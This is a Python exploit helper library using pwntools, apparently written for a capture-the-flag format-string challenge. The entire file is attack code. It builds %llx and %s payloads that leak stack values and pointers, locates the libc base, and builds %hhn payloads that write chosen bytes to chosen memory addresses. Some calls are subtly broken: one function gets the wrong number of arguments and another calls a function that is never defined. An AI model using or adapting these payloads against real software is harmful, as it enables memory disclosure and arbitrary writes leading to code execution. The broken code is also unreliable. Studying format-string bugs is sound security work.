#!/usr/bin/env python
# -*- coding: utf-8 -*-
# pasteBin
#
# bunch of functions to help exploit format strings


import sys
from pwn import *

def extract_printf(refs):
	"""
		Given a list of refs e.g %x, %llx, %10$s
		return a list of the things they return
	"""
	# leak the 'r'th thing off the stack
	gen_ref = lambda r: "*{ref}*".format(ref=r)

	# generate a few of these in a row
	payload = "!!"
	payload += ''.join([gen_ref(r) for r in refs])
	payload += "*OO"

	conn.sendline(payload)
	conn.recvuntil("!!*")
	leaks = conn.recvuntil("*OO")
	leaks = leaks.split('**')[:-1] # remove the OO 
	conn.recvuntil("Your format >")
	return leaks

# get one offset
def dump_offset(offset):
	"""
		Leak the value at an offset using the format string
	"""
	code_leak_payload = "%{ref}$llx".format(ref=offset)
	return int(extract_printf([code_leak_payload])[0],16)

# leak a pointer string
def deref_offset(offset):
	"""
		Leak what an offset value points to using %s
	"""
	code_leak_payload = "%{ref}$s".format(ref=offset)
	return extract_printf([code_leak_payload])[0]

# get a few values
def dump_offset_list(offset, length):
	"""
		dump a list of offsets from the stack
	"""
	# leak the 'r'th thing off the stack
	offset_str = lambda r: "%{ref}$llx".format(ref=r)

	refs = [offset_str(x) for x in range(offset, offset + length)]
	ret = [ int(x,16) for x in extract_printf(refs)]
	return ret

# get a few strings (dereferenced pointers)
def deref_offset_list(offsets):
	"""
		Deref a list of offsets as strings using %s
	"""
	# leak the 'r'th thing off the stack
	offset_str = lambda r: "%{ref}$s".format(ref=r)
	refs = [offset_str(x) for x in offsets]
	ret = [ x for x in extract_printf(refs)]
	return ret


def valid_pointer(data):
	"""
		Ballpark guess if something is a pointer, adjust to taste
		helps it to not crash :D
	"""
	if hex(data)[:3] != "0x7" and hex(data)[:3] != "0x5":
		return False
	if hex(data)[:4] == "0x78": # Y in asci
		return False
	if "000" in hex(data):
		return False
	dLen = len(hex(data))
	if dLen != len("0x55f55d09d6a0") and dLen != len("0x63b944c753c6fc00"):
		return False

	return True

def find_libc_offset(libc):
	"""
		1) Leak memory using the format string
		2) Find the valid pointers/offsets
		3) Deref them and compare with libc
		4) if match, calculate offset

		uses pwntools' ELF library
	"""
	# leak a big range and then deref all the pointers till you find one in libc
	# then adjust the offset
	start = 3
	# leak 10 at a time
	leak_size = 10
	while True:
		leaks = leak_strings(start, leak_size)
		for leak in leaks:
			if len(leak["string"]) > 1: # only worth checking for more than 1 byte leaked
				# search for the string in libc
				code_segments = list(libc.search(leak["string"]))
				# is it unique in libc?
				if len(code_segments) == 1:
					offset_into_libc = code_segments[0]
					return leak["pointer"] - offset_into_libc
		start += leak_size



def leak_strings(start=1, leak_size=10):
	"""
		1) Leak memory using the format string
		2) Find the valid pointers/offsets
		3) Deref them and return their strings (what the point to)

		Returns a list of objects with pointer, offset and string
		[
			{
				"offset" : 6,
 				"pointer" : 0x7ffffffe10,
 				"string" : "flag_is_here"
			}
		]
	"""
	# leak 'leak_size' many pointers starting at 'start' and then deref all the pointers
	# 1) Leak memory using the format string
	pointers = deref_offset_list(start, leak_size)

	leaks = []
	valid_pointers = []
	valid_offsets = []
	# 2) Find the valid pointers/offsets
	for pos, pointer in enumerate(pointers):
		if valid_pointer(pointer):
			valid_pointers += [pointer]
			valid_offsets  += [pos + start]

	if len(valid_pointers) > 0:

		# 3) Deref them 
		strings = leak_offset_list(valid_offsets)
		for x in range(len(strings)):
			leak = {}
			leak["pointer"] = valid_pointers[x]
			leak["offset"]  = valid_offsets[x]
			leak["string"]  = strings[x]
			leaks += [leak]

	return leaks


def set_cur_val(a):
	"""
		~~~ IMPORTANT ~~
		the %n operator write the number of bytes written so far 
		%hhn writes one byte (0x00 -> 0xff)

		This function returns the minimal payload required
		to print out enough whitespace to get the number
		of characters printed to the desired value

		To do this it uses a global counter called 'current_val'
		which represents the number of bytes written so far
	"""
	global current_val

	# Work out how much whitespace we need to overflow
	# the least significant byte to 0x00
	gets_to_zero = 256 - current_val # add this to get to 0x00

	# then add the amount required to get to the desired value
	gets_to_destination = gets_to_zero + a 

	# since it's 1 byte it doesn't make sense to use more than 256 characters
	inc = gets_to_destination%256 # adding > 256 is the same as adding 0 so mod 256

	# update the number of bytes printed
	current_val = a
	# if we don't have to increment then just return an empty string
	if inc == 0: # %0c is the same as %1c so if it's 0 difference then just print nothing
		return "" 
	return "%1$" + str(inc) + "c" 

def payload_write_data_to_addr(data, addr):
	"""
		Writes 4 bytes of your choice to the address given
		This is the back bone of this exploit

		Finikey as fuck
	"""
	global current_val

	# remove '0x' and convert to little endian
	# 0xaabbccdd -> ddccbbaa 
	# 0x12345678 -> 87654321
	hexStr = hex(data)[2:][::-1] 


	# ddccbbaa -> [dd, cc, bb, aa]
	# 87654321 -> [78, 56, 34, 12]
	byteList = [ hexStr[i:i+2][::-1] for i in xrange(0, len(hexStr), 2) ]

	# convert from hex strings to data
	bytes = [int(x,16) for x in byteList]

	# need to offset the payload by 1 byte
	# took me 3 fucking hours to work that out
	payload = "A" 

	# we are going to write to the 4 bytes of 
	# our address. E.G if we got data:0xa1b2c3d4 addr: 0xffb7aa00
	# we would write the following bytes to the addresses below:
	# 0xffb7aa00 : d4
	# 0xffb7aa01 : c3
	# 0xffb7aa02 : b2
	# 0xffb7aa03 : a1
	# 
	# 0xffb7aa00  == d4c3b2a1
	# (int) * 0xffb7aa00  == 0xa1b2c3d4
	# add our addresses to the start of the format string
	for a in range(len(bytes)):
		payload += p32(addr + a) 

	# this is the offset of the first address in our string
	# it also took a while to work out
	offset = 7 

	# set the number of bytes written to be the current length of
	# our payload
	current_val = len(payload)

	# this takes the a'th byte index of the address you want to 
	# write to, and writes the number of bytes printed there
	write_to_byte = lambda a: "%{0}$hhn".format(a + offset)

	# for each byte, set the least significant byte of the
	# value for the number of bytes written
	# and write that to the address
	for pos, byte in enumerate(bytes):
		payload += set_cur_val(byte) + write_to_byte(pos)

	# return the payload string to use
	return payload


def payload_read_addr(addr):
	"""
		Leak the value at address (addr)
		put it in a print statement in between ':::'
		to make finding it easier
	"""

	# necessary offset
	payload = "A" 

	# just writing the address
	payload += p32(addr)

	# this is the offset of the first address in our string
	offset = 7 
	current_val = len(payload)

	payload += ":::%{0}$s:::".format(offset)

	return payload
